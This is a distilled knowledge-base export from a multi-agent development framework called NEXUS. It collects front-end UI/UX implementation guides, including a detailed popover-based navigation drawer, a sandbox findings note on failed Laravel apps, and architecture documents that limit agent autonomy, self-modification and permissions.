> **Origin**: `ui-ux/NEXUS_SANDBOX_UI_FINDINGS.md` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 25/05/2026



**Date**: 2026-05-23
**Context**: NEXUS Sandbox Section 1 generated 11 TALL Stack web applications, all of which failed the UX/UI quality check. The resulting applications were merely default Laravel boilerplate pages with haphazardly injected Livewire components.


1. **Broken Boilerplate**: Agen tidak menghapus halaman dokumentasi bawaan Laravel (`welcome.blade.php` dengan link ke Laracasts/Laravel News). Hal ini membuat aplikasi terlihat seperti *scaffold* awal, bukan produk akhir (MVP).
2. **Missing Application Shell**: Tidak ada satupun aplikasi yang menggunakan struktur `layouts/app.blade.php`. Akibatnya, aplikasi tidak memiliki *navbar*, *footer*, navigasi, atau kerangka UI (Shell) yang layak.
3. **Mangled HTML Injection**: Karena struktur HTML yang kacau, injeksi tag `<livewire:...>` malah merusak *tag* `<body>` dan `<div>`.


Untuk generasi kode selanjutnya (terutama agen `ux-engineer` dan `pipeline-architect`), **patuhi aturan ketat berikut**:

1. **Wajib Hapus Boilerplate**: Setiap kali membuat aplikasi baru, halaman bawaan `welcome.blade.php` **HARUS DIHAPUS TOTAL** isinya dan diganti dengan desain halaman depan/Dashbo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SANDBOX_UI_FINDINGS.md)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Scheduling tasks by priority
> **Origin**: `ui-ux/NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., input handling, critical rendering).
- `user-visible`: Tasks visible to the user but not blocking (default).
- `background`: Tasks that are not time-critical (e.g., analytics, prefetching).

```javascript
// Schedule a high-priority task that blocks user interaction
scheduler.postTask(() => {
  // DO: Handle critical updates that impact user interaction
  handleCriticalUpdate();
}, { priority: 'user-blocking' });

// Schedule a default priority task
scheduler.postTask(() => {
  // DO: Render non-critical content that is visible to the user
  renderSecondaryContent();
}); // Defaults to 'user-visible'

// Schedule a low-priority background task
scheduler.postTask(() => {
  // DO: Perform heavy background work that is not time-critical
  sendAnalytics();
},

#### 🔗 Traceability:
- [Source Context](NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Set a scroll target for the initial render
> **Origin**: `ui-ux/NEXUS_SCROLL-TARGET-ON-LOAD.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The CSS property `scroll-initial-target` offers a declarative, CSS-only way to bring a specific descendant element into the visible area of its scroll container as soon as that container is rendered. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#item-id`), both of which have limitations and are tricky to implement.



To implement this successfully:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Target the Item:** Apply `scroll-initial-target: nearest` to the specific descendant element you want to bring into view.



In this example, a feed starts scrolled to a specific "featured" item rather than the very top of the list.

```css
/** 
 * TARGET: The item that should be visible on initial load.
 */
.item.target {
  scroll-initial-target: nearest;
}
```



- **DO** use `scroll-initial-target` for "middle-start" experiences, such as a calendar starting on the c...

#### 🔗 Traceability:
- [Source Context](NEXUS_SCROLL-TARGET-ON-LOAD.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Select Menu Interaction
> **Origin**: `ui-ux/NEXUS_SELECT-MENU-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_SELECT-MENU-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SHAPED-CUTOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026


CSS Masking allows you to clip an element to a custom shape, such as adding a notch to a card or creating a shaped border. When combining shapes for complex layouts, choose your masking strategy based on the type of content the element contains:

| Masking strategy                | Best For                        | Text Impact                    |
| ------------------------------- | ------------------------------- | ------------------------------ |
| Direct Element SVG Masking      | Images, Icons, Decorative shapes, Complex shapes | Not recommended (can crop text) |
| Adjacent Element SVG Masking    | Cards with Text, Crucial content | Text remains fully readable    |
| Pure CSS Gradients              | Simple Geometric Shapes           | Not recommended (can crop text) |

---


To implement shaped cutouts:


SVG masks allow you to define shapes that subtract from or add to the visible area using white (reveal) and black (hide) fills.

> **Luminance vs. Alpha Masking**: SVG masks default to **luminance** (brightness) mode, which is why we use `fill="white"` to reveal areas and `fill="black"` to cut them out. If yo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SHAPED-CUTOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SIZE-AWARE-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Size-aware styling allows components to change their layout or appearance based on the space available to them, rather than the size of the whole screen. This is useful for components like cards or navigation bars that might be placed in different parts of a layout (like a narrow sidebar or a wide main area).

Using container queries is recommended because it makes components truly modular. You do not need to know where the component will live or write complex media queries to handle every possible layout.





MANDATORY: You must first tell the browser which element is the container to be measured.

```css
.card-container {
  /* Define the container type. Use 'inline-size' for width-based queries. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
}
```



Use the `@container` rule to apply styles when the container reaches a certain size.

```css
/* Default styles for small containers (stacked layout) */
.card {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

/* Styles for larger containers (side-by-side layout) ...

#### 🔗 Traceability:
- [Source Context](NEXUS_SIZE-AWARE-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Stabilize Reactive State with Temporal
> **Origin**: `ui-ux/NEXUS_STABILIZE-REACTIVE-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While some reactive systems (like [React](https://react.dev/)) rely strictly on reference equality to detect state changes, others (like [Vue](https://vuejs.org/) and [Svelte](https://svelte.dev/)) can track mutations to plain objects. However, for built-in objects like the legacy `Date` object, internal mutations (like `setHours()`) do not change the object's reference and are generally not tracked by any framework's default reactivity system. This leads to missed UI updates and hard-to-debug side effects.

The `Temporal` API solves this by providing immutable objects. Any operation that modifies a value (such as adding time or setting a field) returns a new instance with a new memory reference. This guarantees that state updates are always detected by reactive systems, ensuring UI stability.



To stabilize reactive state using Temporal:

1. **Use Temporal types for state:** Store `Temporal` objects (like `Temporal.PlainDateTime` or `Temporal.PlainDate`) in your reactive state instead of legacy `Date` objects.
2. **Perform immutable updates:** When updating the state, use Temporal methods like `.add()`, `.subtract()`, ...

#### 🔗 Traceability:
- [Source Context](NEXUS_STABILIZE-REACTIVE-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Style Parent with :has()
> **Origin**: `ui-ux/NEXUS_STYLE-PARENT-WITH-HAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_STYLE-PARENT-WITH-HAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Validate Input After Interaction
> **Origin**: `ui-ux/NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NAVIGATION-DRAWER.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## Overview

A navigation drawer is a panel that slides in from the edge of the viewport over the page content, dimming everything behind it. It is opened from a trigger button and dismissed by swiping the panel off-screen, tapping the dimmed backdrop, or pressing Escape.

This guide implements the drawer as:

- A `popover="manual"` element promoted to the top layer so the panel and its `::backdrop` overlay every other element on the page, regardless of stacking context.
- A horizontally scrolling container with two CSS scroll-snap stops — one for "open", one for "closed" — so the swipe gesture is handled natively by the browser. This delivers momentum, velocity, and interruption tracking for free, with no JavaScript pointer-event code.
- A scroll-driven animation that ties the backdrop's opacity to the scroll position, so the dim fades in and out smoothly as the user drags the panel.
- An `IntersectionObserver` on the panel that detects when it has fully entered or fully left the viewport, and uses those moments to update focus, `aria-expanded`, and `inert`.

This approach is preferred over JavaScript-driven `transform` animations because the scroll mechanism gives the user direct control of the panel's position (their finger drives it, not a tween) and it much more closely matches the interaction patterns that users are accustomed to in native mobile apps.

## Implementation

### 1. Markup

The drawer is a single popover containing a horizontal scroller, which contains the visible "sheet". The trigger button lives in the page content.

```html
<!-- popover="manual" is REQUIRED. Do not use popover="auto" or "hint". -->
<div class="Drawer" id="drawer" popover="manual">
  <div class="Drawer-scroller">
    <nav class="Drawer-sheet" tabindex="-1">
      <!-- tabindex="-1" makes the sheet programmatically focusable so we
           can move focus into it when the drawer opens, without adding it
           to the natural tab order. -->
      <ul>
        <li><a href="/page-1">Page 1</a></li>
        <li><a href="/page-2">Page 2</a></li>
        <!-- ... -->
      </ul>
    </nav>
  </div>
</div>

<main>
  <header>
    <!-- aria-controls links the trigger to the drawer; aria-expanded
         reflects the current state for assistive tech. -->
    <button id="drawer-open"
            aria-label="Menu"
            aria-expanded="false"
            aria-controls="drawer">
      <!-- MANDATORY: Inline decorative SVGs MUST define aria-hidden="true" -->
      <svg aria-hidden="true" viewBox="0 0 24 24">...</svg>
    </button>
  </header>
  <!-- Page content. -->
</main>
```

### 2. Styles

#### Reset the popover and fill the viewport

The popover must cover the whole viewport so its `::backdrop` dims the entire page and the swipe surface extends edge-to-edge. The default user-agent popover styles (centered, auto-sized, bordered) get in the way and must be reset.

```css
.Drawer {
  /* min() caps the sheet width on large screens but on a phone leaves
     a 20% peek of page content visible, which is the affordance that
     tells the user they can tap outside to dismiss. */
  --drawer-width: min(20em, 80dvw);

  /* Custom property driven by the scroll-driven animation below.
     0 = drawer fully closed (transparent backdrop).
     1 = drawer fully open (visible backdrop). */
  --drawer-backdrop: 0;

  /* Reset UA popover style that would constrain the element. */
  width: auto;
  height: auto;
  background: transparent;
  border: 0;
  overflow: visible;
}

/* Style the popover's ::backdrop to achive the overlay effect and
   provide visual affordances indicating that the rest of the page is inert */
.Drawer::backdrop {
  background: #000;
  /* Use calc() to limit the opacity range so the content beneath is visible */
  opacity: calc(var(--drawer-backdrop) / 2);
}
```

#### Build the swipe surface with scroll snap

The scroller is a horizontal grid wider than the viewport: column 1 holds the sheet (width `--drawer-width`), column 2 is an empty pseudo-element spacer the width of the viewport. Snapping between the two columns is what opens and closes the drawer.

```css
.Drawer-scroller {
  position: relative;
  display: grid;
  /* Sheet on the left, full-viewport spacer on the right. The user
     scrolls between the two snap stops to open and close. */
  grid-template-columns: var(--drawer-width) 100%;

  overflow-x: scroll;
  /* Stop the swipe from chaining into the page's vertical scroll
     when the user reaches either snap edge. */
  overscroll-behavior: none;
  scrollbar-width: none;
  /* `mandatory` guarantees the drawer always settles fully open or
     fully closed — never half-open after a partial swipe. */
  scroll-snap-type: x mandatory;
}

/* Enable smooth scrolling natively, but only if the user has not
   requested reduced motion. */
@media (prefers-reduced-motion: no-preference) {
  .Drawer-scroller {
    scroll-behavior: smooth;
  }
}

/* The empty spacer that creates the "closed" snap stop. */
.Drawer-scroller::after {
  content: '';
  scroll-snap-align: end;
  /* Open the popover already scrolled to this stop (drawer off-screen),
     so the JS only needs to scroll to the open position to
     animate it in. */
  scroll-initial-target: nearest;
}

.Drawer-sheet {
  display: grid;
  grid-template-rows: auto 1fr;
  /* Use `svh` (small viewport height) — not `vh` or `dvh` — so the
     sheet height does not jump when the iOS Safari address bar
     resizes mid-swipe. */
  height: 100svh;

  background: #333;
  color: #fff;
  overflow-y: auto;
  scroll-snap-align: start;
  scrollbar-width: none;
}
```

#### Tie the backdrop opacity to the scroll position

A scroll-driven animation maps `--drawer-backdrop` from 1 (open) to 0 (closed) across the scroller's range, so the backdrop fades in and out perfectly synced with the drag.

```css
/* MANDATORY: Wrap this entire block in @supports. Browsers that don't
   support animation-timeline still parse the @keyframes and would
   apply the animation's `0%` value (--drawer-backdrop: 1) at all
   times, leaving the backdrop permanently opaque. The @supports gate
   ensures the animation is only registered where it actually works. */
@supports (animation-timeline: scroll()) {
  .Drawer {
    /* timeline-scope lets .Drawer reference a scroll-timeline that
       is defined on its descendant (the scroller). Without this, the
       timeline name is not visible to the .Drawer element. */
    timeline-scope: --drawer-fade;
    animation: fade-drawer-backdrop linear both;
    animation-timeline: --drawer-fade;
  }

  .Drawer-scroller {
    /* The horizontal scroll position of this element drives the
       timeline named `--drawer-fade`. */
    scroll-timeline: --drawer-fade x;
  }

  /* @property is REQUIRED. Without registering --drawer-backdrop with
     a `<number>` syntax, the browser treats it as a string and cannot
     interpolate it — the backdrop would jump from 0 to 1 with no
     fade. */
  @property --drawer-backdrop {
    syntax: '<number>';
    inherits: true;
    initial-value: 0;
  }

  @keyframes fade-drawer-backdrop {
    /* Scroll position 0 = drawer fully open = backdrop visible. */
    0% { --drawer-backdrop: 1 }
    /* Scroll position 100% = drawer fully closed = backdrop hidden. */
    100% { --drawer-backdrop: 0 }
  }
}
```

### 3. Open and close the drawer

Opening is two steps: promote the popover to the top layer, then scroll the sheet into view. Closing is one step: scroll back to the spacer; an observer (step 4) hides the popover once the sheet is fully off-screen.

```js
const drawer = document.getElementById('drawer');
const openBtn = document.getElementById('drawer-open');
const scroller = drawer.querySelector('.Drawer-scroller');
const sheet = drawer.querySelector('.Drawer-sheet');

function openDrawer() {
  // Show the popover first so the element is in the top layer before
  // we trigger any scrolling. `scroll-initial-target` (set on the
  // ::after spacer) places the initial scroll position at the closed
  // stop, so the drawer enters the top layer already off-screen.
  drawer.showPopover();

  // Scroll the sheet into view. The `behavior: 'auto'` option defers
  // to the CSS `scroll-behavior` property, which will be smooth unless
  // the user prefers reduced motion. Snap takes over at the end and
  // locks the drawer fully open.
  scroller.scrollTo({left: 0, behavior: 'auto'});
}

function closeDrawer() {
  // Scroll back to the spacer. Do NOT call hidePopover() here —
  // doing so would remove the element from the top layer mid-animation
  // and the close animation would not be visible. The
  // IntersectionObserver in step 4 hides the popover once the sheet
  // has actually left the viewport.
  scroller.scrollTo({left: scroller.offsetWidth, behavior: 'auto'});
}
```

### 4. Detect open and closed state

Use an `IntersectionObserver` on the sheet — not the scroll position — as the source of truth for the drawer's state. The observer fires regardless of how the sheet moved (user swipe, programmatic scroll, snap settle), so all dismissal paths converge in the same callback.

```js
function onDrawerOpened() {
  // Mark the rest of the page inert so keyboard and screen-reader
  // users cannot tab into content hidden behind the drawer.
  document.querySelector('main').inert = true;
  openBtn.setAttribute('aria-expanded', 'true');
  // Move focus into the drawer for keyboard users.
  sheet.focus();
}

function onDrawerClosed() {
  // Hide the popover only after the close animation completes,
  // so the slide-out is visible to the user.
  drawer.hidePopover();
  document.querySelector('main').inert = false;
  openBtn.setAttribute('aria-expanded', 'false');
}

// Treat "any pixel of the sheet visible inside the popover root" as
// "open enough to count as not closed". This threshold is intentionally
// tiny so the closed callback only fires once the sheet is truly gone.
const visibleThreshold = 1 / window.innerWidth;

const observer = new IntersectionObserver(
  (entries) => {
    // During programmatic scrolling the observer can deliver multiple
    // entries in one batch. Only the most recent describes the
    // current state; earlier entries are intermediate positions.
    const entry = entries.at(-1);
    if (entry.intersectionRatio < visibleThreshold) onDrawerClosed();
    if (entry.intersectionRatio === 1) onDrawerOpened();
  },
  // root: drawer makes the popover element the intersection root,
  // so the ratio reflects the sheet's visibility within the popover
  // (i.e. how much of it has been swiped on-screen).
  {root: drawer, threshold: [visibleThreshold, 1]},
);
observer.observe(sheet);
```

### 5. Wire up the trigger and dismissal handlers

```js
// Open trigger.
openBtn.addEventListener('click', openDrawer);

// Light-dismiss: a tap on the dimmed area (anywhere inside the
// popover but outside the sheet) closes the drawer. We implement
// this manually because popover="manual" disables the browser's
// built-in light-dismiss (which would also fire mid-swipe — see step 1).
drawer.addEventListener('click', (event) => {
  if (!sheet.contains(event.target)) closeDrawer();
});

// Escape key. Listen on document because focus may be inside the
// drawer when the user presses Escape.
document.addEventListener('keydown', (event) => {
  if (event.key === 'Escape') closeDrawer();
});
```

### Fallback strategies

Baseline status for Popover: Newly available. It's been Baseline since 2025-01-27.
Supported by: Chrome 116 (Aug 2023), Edge 116 (Aug 2023), Firefox 125 (Apr 2024), Safari 17 (Sep 2023), and Safari iOS 18.3 (Jan 2025).

The drawer's core mechanics — scroll snap, `IntersectionObserver`, and `inert` — are all Baseline Widely available and required for the component to function. The popover API, the scroll-driven animation that fades the backdrop, and `scroll-initial-target` are progressive enhancements with simple fallbacks that can be easily implemented if wide browser support is required.

#### Backdrop fade fallback (no `animation-timeline` support):

Scroll-driven animations has limited availability.
Supported by: Chrome 115 (Jul 2023), Edge 115 (Jul 2023), and Safari 26 (Sep 2025).
Unsupported in: Firefox.

Detect with `CSS.supports('animation-timeline: scroll()')` and write `--drawer-backdrop` from a `scroll` event listener if not supported. The CSS `@supports` block in step 2 ensures the keyframes never apply in unsupported browsers, so the JavaScript value is the only writer.

```js
if (!CSS.supports('animation-timeline: scroll()')) {
  scroller.addEventListener('scroll', () => {
    // Same mapping as the @keyframes: 0 scroll = 1 (open),
    // sheet-width scroll = 0 (closed).
    const ratio = 1 - scroller.scrollLeft / sheet.offsetWidth;
    drawer.style.setProperty('--drawer-backdrop', ratio);
  });
}
```

#### Initial scroll position fallback (no `scroll-initial-target` support):

scroll-initial-target has limited availability.
Supported by: Chrome 133 (Feb 2025) and Edge 133 (Feb 2025).
Unsupported in: Firefox and Safari.

Detect with `CSS.supports('scroll-initial-target', 'nearest')` and inside `openDrawer()`, jump-scroll the scroller to the closed position immediately after `showPopover()`. Without this, the drawer would appear instantly in the open position with no slide-in animation.

```js
async function openDrawer() {
  drawer.showPopover();

  if (!CSS.supports('scroll-initial-target', 'nearest')) {
    // Jump-scroll to the closed stop so the scroll below
    // animates the drawer in from off-screen.
    scroller.scrollTo({left: scroller.offsetWidth, behavior: 'instant'});
    // Wait two animation frames for the jump-scroll to commit.
    // A single rAF is not enough — the second `scrollTo` would
    // cancel the first before the browser has a chance to apply it.
    await new Promise((r) =>
      requestAnimationFrame(() => requestAnimationFrame(r))
    );
  }

  scroller.scrollTo({left: 0, behavior: 'auto'});
}
```

#### `@property` fallback (no registered custom properties):

Baseline status for Registered custom properties: Newly available. It's been Baseline since 2024-07-09.
Supported by: Chrome 85 (Aug 2020), Edge 85 (Aug 2020), Firefox 128 (Jul 2024), and Safari 16.4 (Mar 2023).

`@property` is only needed because the scroll-driven animation interpolates `--drawer-backdrop` between keyframes — without registration, the property would be treated as a string and would jump between 0 and 1 with no fade. If the scroll-driven animation fallback above is in place, that JavaScript writes a fresh numeric string to `--drawer-backdrop` on every scroll frame and never interpolates, so no seprarate `@property` fallback is needed since all browsers that support scroll-driven animations also support `@property`.


#### Popover API fallback (no `popover` attribute support):

Baseline status for the api.HTMLElement.showPopover capability: Newly available. It's been Baseline since 2024-04-16.
Supported by: Chrome 114 (May 2023), Edge 114 (Jun 2023), Firefox 125 (Apr 2024), and Safari 17 (Sep 2023).

Because this component uses `popover="manual"` and implements dismissal entirely from JavaScript, it does not depend on the popover API's defining behaviors — light-dismiss, the `popovertarget` attribute, top-layer-managed Escape handling, or focus management. The only popover features it actually uses are top-layer promotion (via `showPopover()`) and the `::backdrop` pseudo-element, which have been Baseline since April 2024.

If wider browser support is needed, do not branch on feature detection — simply do not use popover at all. Drop the `popover="manual"` attribute, replace top-layer promotion with `position: fixed` and a high `z-index`, replace `::backdrop` with a sibling element styled identically (using the same `--drawer-backdrop` custom property), and toggle visibility from a class instead of `showPopover()`/`hidePopover()`. The rest of the component (scroll snap, the scroll-driven backdrop animation, the `IntersectionObserver`, and the dismissal handlers) is unchanged.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS ARCHITECTURE MULTI AGENT.MD

# NEXUS Architecture Roadmap
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Phase Focus: Multi-Agent Stabilization

> Current Classification:
> **Semantic Modular Multi-Agent Framework**

---

# 1. Objective

Fokus utama NEXUS saat ini adalah:

- menstabilkan komunikasi antar agent
- memastikan konsistensi memory
- membangun orchestration yang modular
- membuat capability system yang scalable
- mengurangi coupling antar subsystem

Target fase ini **BUKAN AGI** dan **BUKAN full autonomy**.

Target utama:

```text
Reliable Multi-Agent Cognitive Infrastructure
```

---

# 2. Current System Boundary

## Included Scope

NEXUS saat ini mencakup:

- semantic knowledge processing
- multi-agent orchestration
- dynamic plugin execution
- knowledge distribution pipeline
- modular scanner ecosystem
- workflow intelligence

---

## Excluded Scope

NEXUS saat ini BELUM mencakup:

- AGI
- self-awareness
- autonomous goal creation
- recursive architecture redesign
- independent cognition
- fully autonomous runtime

---

# 3. Architectural Position

```mermaid
graph LR

    A[LLM]
    B[Tool Agents]
    C[Workflow Agents]
    D[Multi-Agent Framework]
    E[Autonomous Runtime]
    F[AGI]

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F

    X[NEXUS Current State] --> D
```

---

# 4. Core Stabilization Priorities

## 4.1 Agent Role Isolation

Setiap agent wajib memiliki:

- single responsibility
- clear execution boundary
- predictable input/output
- minimal side effects

---

## Recommended Structure

```text
agents/
│
├── crawler/
├── memory/
├── distribution/
├── forge/
├── scanners/
└── orchestration/
```

---

## Anti-Pattern

Hindari:

```text
1 agent mengerjakan semuanya
```

atau:

```text
shared mutable logic antar agent
```

---

# 5. Standardized Agent Protocol

Semua agent wajib menggunakan protocol yang sama.

## Recommended Protocol

```json
{
  "agent": "memory_pipeline",
  "task_id": "UUID",
  "input": {},
  "context": {},
  "priority": "normal",
  "timestamp": "",
  "status": "pending"
}
```

---

## Required Rules

### Every Agent Must:

- validate input
- return structured output
- log execution result
- expose error states
- avoid direct filesystem mutation outside scope

---

# 6. Orchestration Layer

## Current Recommendation

Pisahkan orchestration dari logic agent.

```text
GOOD:
orchestrator -> agents

BAD:
agents -> control agents directly
```

---

## Recommended Architecture

```mermaid
flowchart TD

    A[Orchestrator]
    B[Crawler Agent]
    C[Memory Agent]
    D[Distribution Agent]
    E[Forge Agent]
    F[Scanner Pool]

    A --> B
    A --> C
    A --> D
    A --> E
    A --> F
```

---

# 7. Memory Consistency

## Critical Rule

Semantic memory wajib menjadi:

```text
single source of truth
```

---

## Recommended Layers

```text
memory/
│
├── raw/
├── normalized/
├── semantic/
├── distilled/
└── operational/
```

---

## Required Stability Features

### Must Have:

- checksum validation
- versioning
- rollback capability
- conflict detection
- tag normalization

---

# 8. Plugin System Stabilization

## Recommended Plugin Boundary

Setiap scanner/plugin wajib memiliki:

```text
manifest
execution contract
permission scope
output schema
```

---

## Example

```json
{
  "name": "security_scanner",
  "version": "1.0",
  "permissions": ["read_logs"],
  "entry": "scanner.js"
}
```

---

# 9. Dynamic Scanner Safety

## Required Protection

Dynamic execution WAJIB memiliki:

- timeout
- execution isolation
- crash protection
- retry limits
- logging

---

## Recommended

Gunakan:

```text
sandbox execution layer
```

untuk scanner hasil forging.

---

# 10. Knowledge-to-Code Boundary

## IMPORTANT

Machine Forging TIDAK BOLEH:

- overwrite core engine
- mutate orchestration layer
- modify memory protocols
- self-register unrestricted permissions

---

## Safe Boundary

Forging hanya boleh:

```text
generate isolated capability modules
```

---

# 11. Logging & Observability

## Mandatory

Semua subsystem wajib memiliki:

- execution logs
- error logs
- task tracing
- performance metrics

---

## Recommended Structure

```text
logs/
│
├── agents/
├── orchestration/
├── scanners/
├── memory/
└── forge/
```

---

# 12. Stability Before Autonomy

## Current Priority

Fokus utama saat ini:

```text
stability > intelligence
```

Karena:

- unstable agents cannot evolve
- unstable orchestration creates chaos
- unstable memory corrupts cognition

---

# 13. Recommended Technical Direction

## Short-Term

### Keep:

- rapid iteration
- modular architecture
- semantic workflows

### Avoid:

- premature AGI claims
- uncontrolled self-modification
- overcomplex autonomy loops

---

# 14. Recommended Tech Stack

## Suggested Hybrid Model

### Core Runtime

- C++
- Rust
- Go

### AI Layer

- Python

### Memory Layer

- SQLite
- PostgreSQL
- Vector DB
- Graph DB

---

# 15. Long-Term Evolution Path

```mermaid
graph TD

    A[Single Agents]
    B[Multi-Agent System]
    C[Stable Orchestration]
    D[Persistent Runtime]
    E[Autonomous Runtime]
    F[Distributed Cognitive System]

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
```

---

# 16. Final Positioning

## Accurate Technical Description

```text
NEXUS is a modular semantic multi-agent framework
focused on dynamic knowledge orchestration,
capability distribution, and scalable cognitive workflows.
```

---

# 17. Strategic Principle

```text
Do not optimize for AGI.
Optimize for stable orchestration first.
```

Karena:

- orchestration menghasilkan scalability
- stability menghasilkan survivability
- modularity menghasilkan evolvability
- observability menghasilkan maintainability

Tanpa itu, autonomous system akan menjadi tidak terkendali.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT.MD

# NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## ⚠️ PURPOSE (INTERNAL CORE ONLY)

NEXUS Internal Core adalah:

> **Deterministic Knowledge Operating System berbasis dokumentasi**

Fungsi utamanya:

- memproses pengetahuan dari dokumentasi
- menjaga konsistensi struktur pengetahuan
- menjalankan pipeline evolusi pengetahuan secara terkendali

**Bukan:**

- AI system
- reasoning engine bebas
- self-learning system
- autonomous decision maker

---

## 🔒 CORE PHILOSOPHY (WAJIB DIKUNCI)

1. **Deterministic over Adaptive**
2. **Structure over Intelligence**
3. **Explicit Rules over Implicit Behavior**
4. **Controlled Evolution over Self-Evolution**
5. **State Machine over Dynamic Flow**

---

## 🧱 SYSTEM MODEL (WAJIB)

Internal Core HARUS direpresentasikan sebagai:

> **State-Driven Knowledge Pipeline Engine**

Dengan lifecycle tetap:

```text
INIT → AUDIT → PLAN → EXECUTE → VERIFY → RECORD → DISTILL
```

❗ Urutan ini **tidak boleh diubah secara dinamis**

---

## 🔒 HARD BOUNDARY (PAGAR INTERNAL)

### 1. NO AI / NO PROBABILISTIC SYSTEM

Internal Core:

- ❌ Tidak boleh menggunakan LLM
- ❌ Tidak boleh menggunakan ML
- ❌ Tidak boleh ada probabilistic decision

Semua keputusan:

> ✔ Rule-based
> ✔ Fully predictable
> ✔ Reproducible

---

### 2. NO SELF-EVOLUTION

Walaupun ada:

- `Machinist`
- `Update Engine`

Dibatasi keras:

❌ Dilarang:

- mengubah dirinya sendiri tanpa rule eksplisit
- membuat logic baru secara otomatis
- menambah pipeline stage baru secara dinamis

✔ Diperbolehkan:

- modifikasi berbasis rule statis
- injeksi terkontrol dengan validasi ketat

---

### 3. NO UNSTRUCTURED DATA FLOW

Semua data HARUS:

- memiliki struktur formal
- tervalidasi oleh kontrak

❌ Dilarang:

- manipulasi string bebas
- parsing tanpa schema
- operasi berbasis asumsi

---

### 4. SINGLE SOURCE OF TRUTH: INTERNAL STATE

Bukan file system.

Internal Core HARUS:

> bekerja di atas **in-memory representation**

File system hanya:

- input awal
- output akhir

❌ Dilarang:

- menjadikan file sebagai state utama
- side-effect antar stage

---

### 5. STRICT STAGE ISOLATION

Setiap stage:

- hanya menerima input
- menghasilkan output

❌ Dilarang:

- akses langsung ke stage lain
- modifikasi global state tanpa kontrol

---

## 🧠 DATA MODEL (WAJIB ADA)

Internal Core HARUS memiliki representasi formal:

```cpp
struct NexusState {
    DocumentAST ast;
    KnowledgeGraph knowledge;
    ExecutionPlan plan;
    ValidationReport report;
}
```

Semua stage hanya boleh memproses:

> **NexusState**

---

## 🔄 PIPELINE CONTRACT

Setiap stage wajib mengikuti kontrak:

```cpp
StageResult process(const NexusState& input);
```

Dengan aturan:

- tidak boleh side-effect
- tidak boleh I/O langsung
- tidak boleh skip validasi

---

## ⚙️ EXECUTION RULE

Pipeline berjalan:

```text
State(n) → Process → State(n+1)
```

❗ Tidak boleh:

- lompat stage
- eksekusi paralel tanpa kontrol deterministik
- branching liar

---

## 🧨 COLLISION LOGIC (WAJIB TERKONTROL)

Format wajib:

```text
IF {Existing} ELSE {New}
```

Aturan:

- tidak boleh overwrite langsung
- tidak boleh merge tanpa rule
- harus bisa dilacak (traceable)

---

## 🧱 MEMORY SYSTEM RULE

### HUB / Knowledge:

- harus immutable per stage
